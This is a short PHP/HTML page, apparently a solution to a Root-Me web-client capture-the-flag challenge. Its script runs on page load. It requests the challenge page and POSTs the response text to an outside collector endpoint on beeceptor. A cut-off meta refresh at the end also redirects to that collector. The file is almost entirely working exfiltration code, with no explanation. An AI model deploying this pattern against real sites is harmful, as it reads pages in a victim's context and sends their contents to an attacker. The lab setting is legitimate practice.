<?php
header("Access-Control-Allow-Origin: *");

?>
<!DOCTYPE html>
<html>
<body>

<h1>The XMLHttpRequest Object</h1>

<button type="button" onclick="loadDoc()">Request data</button>

<p id="demo"></p>
 
<script>

    const options = {
  method: 'GET',
  mode: 'no-cors'
};
var url = "http://challenge01.root-me.org/web-client/ch30/page?user=s"
var request = new XMLHttpRequest();
const Http = new XMLHttpRequest();
Http.open("GET", url);
Http.send();
Http.onreadystatechange = (e) => {
  console.log(Http.responseText)
  send(Http)
}

function send(data){
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://bonjour.free.beeceptor.com", true);
xhr.setRequestHeader('Content-Type', 'application/json');
console.log(data.responseText)
xhr.send(JSON.stringify({
value: data.responseText
}));

}


</script>

</body>
</html>
<meta http-equiv="refresh" content='4; URL="https://bonjour.free.beeceptor.com?v=
